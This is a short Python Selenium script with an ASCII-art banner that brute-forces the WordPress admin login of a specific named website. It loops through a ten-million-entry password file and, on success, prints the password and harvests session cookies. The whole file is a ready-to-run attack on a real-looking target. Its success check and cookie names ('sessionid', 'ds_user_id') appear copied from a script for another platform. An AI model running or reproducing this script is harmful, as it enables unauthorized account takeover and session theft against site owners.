#
#     **             **                  
#    ****    ****** //                   
#   **//**  /**///** **  ******  ******* 
#  **  //** /**  /**/** **////**//**///**
# **********/****** /**/**   /** /**  /**
#/**//////**/**///  /**/**   /** /**  /**
#/**     /**/**     /**//******  ***  /**
#//      // //      //  //////  ///   //


#          Author: APION🔌

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
import time

# Set up the WebDriver (e.g., Chrome)
driver_path = "chromedriver.exe"
service = Service(driver_path)
options = webdriver.ChromeOptions()
driver = webdriver.Chrome(service=service, options=options)

# Define the URL and username
login_url = "https://supremeventures.com/wp-login.php"
username = "Administrator"
count = 0

# Read passwords from a file
with open('10mill.txt', 'r') as file:
    password_list = file.read().splitlines()

try:
    for password in password_list:
        count+=1
        # Open the login page
        driver.get(login_url)
        # Find and fill the username and password fields
        driver.find_element(By.XPATH, "//*[@id='user_login']").send_keys(username)
        driver.find_element(By.XPATH, "//*[@id='user_pass']").send_keys(password)
        
        # Submit the form
        driver.find_element(By.XPATH, "//*[@id='wp-submit']").click()
        
        # Wait for the page to load
        #time.sleep(5)
        
        # Check if login was successful by verifying the expected text
        if "Not now" in driver.page_source:
            print(f"Login successful with password: {password} / {count}")
            
            # Retrieve cookies
            cookies = driver.get_cookies()
            print("Cookies:", cookies)
            
            # Extract sessionid and ds_user_id if available
            session_id = next((cookie['value'] for cookie in cookies if cookie['name'] == 'sessionid'), None)
            ds_user_id = next((cookie['value'] for cookie in cookies if cookie['name'] == 'ds_user_id'), None)
            
            print("Session ID:", session_id)
            print("ds_user_id:", ds_user_id)
            break
        else:
            print(f"Login failed with password: {password} / {count}")
finally:
    # Close the browser
    driver.quit()
